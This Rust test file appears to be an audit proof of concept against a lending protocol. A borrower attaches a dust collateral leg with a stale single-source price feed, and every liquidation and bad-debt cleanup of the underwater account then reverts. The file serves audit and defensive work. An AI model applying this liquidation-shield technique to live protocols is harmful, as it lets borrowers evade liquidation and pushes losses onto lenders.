//! Exploit proof for the surviving hypothesis:
//! "One unpriceable collateral leg bricks liquidation of the entire account."
//!
//! `liquidate` and `clean_bad_debt` both open with
//! `risk::calculate_account_risk_totals`, which prices EVERY supply leg through
//! the strictly fail-closed `cached_price` resolver (no `try_`, no per-asset
//! skip, no last-good fallback for a Single-strategy feed). A borrower can plant
//! a dust supply leg in a fragile single-source collateral through `supply`,
//! which reads no price and runs no post-pool risk gate, so the leg attaches even
//! while its feed is already stale. Once the account is underwater, the risk walk
//! dies pricing that dust leg and both loss-mitigation endpoints revert
//! `PriceFeedStale` instead of proceeding — a self-inflicted liquidation shield.

use test_harness::{
    errors, eth_preset, usd, usd_cents, usdc_preset, wbtc_preset, LendingTest, LIQUIDATOR,
};

#[test]
fn audit_liquidate_and_clean_bricked_by_unpriceable_dust_leg() {
    let mut t = LendingTest::new()
        .with_market(usdc_preset()) // healthy, robust collateral
        .with_market(eth_preset()) // borrowable
        .with_market(wbtc_preset()) // fragile single-source collateral
        .with_dust_disabled_all_markets()
        .build();

    // WBTC priced single-source spot: the mainnet strategy=0 RWA shape whose lone
    // feed, once stale, has no anchor to fall back to.
    t.set_oracle_single_spot("WBTC");

    // Borrower opens a healthy position on the robust side.
    t.supply(LIQUIDATOR, "USDC", 50_000.0); // seed pool liquidity for the borrow
    let borrower = test_harness::ALICE;
    t.supply(borrower, "USDC", 10_000.0);
    t.borrow(borrower, "ETH", 3.0); // ~$6000 debt vs $8000 weighted => healthy

    // While fresh, the risk walk works: a premature liquidation is rejected on
    // HEALTH, not on pricing.
    let fresh = t.try_liquidate(LIQUIDATOR, borrower, "ETH", 1.0);
    test_harness::assert_contract_error(fresh, errors::HEALTH_FACTOR_TOO_HIGH);

    // Freeze WBTC's feed: advance the ledger (USDC/ETH refresh), then re-stamp
    // WBTC's spot at a backdated timestamp so the single-source read is stale.
    t.advance_time(5_000);
    let now = t.env.ledger().timestamp();
    let wbtc = t.resolve_asset("WBTC");
    t.mock_reflector_client()
        .set_price_at(&wbtc, &usd(60_000), &(now - 3_600));

    // The dust plant succeeds despite the dead feed (supply prices nothing).
    let plant = t.try_supply(borrower, "WBTC", 0.001);
    assert!(
        plant.is_ok(),
        "supply must accept the fragile leg with a stale feed: {plant:?}"
    );

    // Drive the account underwater on the robust side.
    t.set_price("USDC", usd_cents(50));

    let borrower_id = t.resolve_account_id(borrower);

    // KEY ASSERTION 1: liquidate is vetoed by the stale dust leg. The revert is
    // PriceFeedStale (risk walk dies pricing WBTC), NOT HealthFactorTooHigh.
    let liq = t.try_liquidate(LIQUIDATOR, borrower, "ETH", 1.0);
    test_harness::assert_contract_error(liq, errors::PRICE_FEED_STALE);

    // KEY ASSERTION 2: clean_bad_debt is bricked identically.
    let clean = t.try_clean_bad_debt_by_id(borrower_id);
    test_harness::assert_contract_error(clean, errors::PRICE_FEED_STALE);

    // Causation pin: re-stamp WBTC fresh, change nothing else. Both endpoints
    // recover, proving the stale leg alone was the blocker.
    t.set_price("WBTC", usd(60_000));
    let recovered = t.try_liquidate(LIQUIDATOR, borrower, "ETH", 1.0);
    assert!(
        recovered.is_ok(),
        "once WBTC is fresh, the identical liquidation must succeed: {recovered:?}"
    );
    assert!(
        t.borrow_balance(borrower, "ETH") < 3.0,
        "post-recovery liquidation must reduce the borrower's debt"
    );
}
